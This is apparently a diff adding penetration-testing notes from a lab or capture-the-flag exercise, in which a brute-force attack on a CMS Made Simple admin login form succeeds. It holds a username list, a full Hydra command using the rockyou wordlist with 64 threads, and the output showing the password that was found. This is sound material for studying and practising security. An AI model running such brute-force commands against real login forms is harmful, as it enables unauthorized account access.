@@ -1,0 +1,16 @@
+# Hydra brute-force against the CMS Made Simple admin login form
+# discovered at /simple/admin/login.php. Username list built from
+# users.txt (case variants included since the form is case-sensitive
+# and the exact display name wasn't confirmed yet at this stage).
+# ---------------------------------------------------------------------
+
+Usernames tried (users.txt):
+mitch
+Mitch
+admin
+
+Command:
+hydra -L users.txt -P ~/hdd/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -t 64 10.112.191.243 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=User name or password incorrect"
+
+Result:
+[80][http-post-form] host: 10.112.191.243   login: mitch   password: secret
